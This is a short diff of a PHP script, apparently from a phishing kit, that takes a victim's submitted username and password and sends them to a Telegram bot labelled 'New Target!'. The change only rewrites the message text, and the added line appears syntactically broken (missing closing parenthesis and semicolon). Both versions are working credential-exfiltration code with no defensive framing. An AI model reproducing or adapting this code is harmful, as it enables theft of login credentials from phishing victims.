@@ -3,7 +3,7 @@ require "setting.php";
 $user=$_POST['username'];
 $pass=$_POST['password'];
 try{
-$resp=file_get_contents("https://api.telegram.org/bot{$Token}/sendMessage?chat_id={$user_id}&text=New Target! Join -> @rmsup -> USER:PASS -> {$user}:{$pass}");
+$resp=file_get_contents("https://api.telegram.org/bot{$Token}/sendMessage?chat_id={$user_id}&text=New Target! Xmoxd-->(user:{$user})password:{$pass}"
 }
 catch (Exception $ex)
 {
